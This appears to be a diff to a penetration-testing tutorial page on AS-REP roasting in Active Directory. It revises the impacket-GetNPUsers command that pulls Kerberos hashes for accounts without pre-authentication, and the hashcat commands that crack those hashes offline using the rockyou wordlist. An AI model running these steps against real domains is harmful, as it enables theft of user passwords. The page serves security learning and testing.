@@ -39,29 +39,34 @@ Next, we can use the `impacket-GetNPUsers` script which&#x20;
 
 {% code overflow="wrap" %}
 ```sh
-$ impacket-GetNPUsers -dc-ip <DOMAIN_CONTROLLER> -usersfile <PATH_TO_USERS_LIST> -format {hashcat,john}
+$ impacket-GetNPUsers -dc-ip <DOMAIN_CONTROLLER> -usersfile <PATH_TO_USERS_LIST> -format {hashcat,john} <TARGET>
 ```
 {% endcode %}
 
+* `<TARGET>:` The domain user account to authenticate to the KDC with
+  * as long as a valid user account is provided, this value will not affect the results of the script
 * `-dc-ip:` Address of the domain controller
 * `-usersfile:` List of domain users to check against (retrieved from previous step)
 * `-format:` Output format (hashcat or john). Default is hashcat.
 
-With this, we should retrieve the TGTs for the users with the pre-authentication disabled.
+With this, we should retrieve the TGTs for users with the pre-authentication disabled.
 
 ### (3) Offline cracking
 
 Given that we output the hashes in hashcat format, we can perform the following commands to crack the passwords:
 
 ```sh
-$ hashcat -a 0 -m 18200 <path_to_hashes> <wordlist>
+$ hashcat -a 0 -m <hash_mode> <path_to_hashes> <wordlist>
 
 # eg. 
 $ echo xxx > hashes.txt
-$ hashcat -a 0 -m 18200 hashes.txt /usr/share/wordlist/rockyou.txt
+$ hashcat -a 0 -m <hash_mode> hashes.txt /usr/share/wordlist/rockyou.txt
 ```
 
-
+* `-a`: Attack mode
+  * `-a 0`: Dictionary attack
+  * `-m` : Hash mode
+* `-m <hash_mode>`: either one of **18200, 32100, 32200** (depending on the encryption type of the hashes obtained)
 
 
 
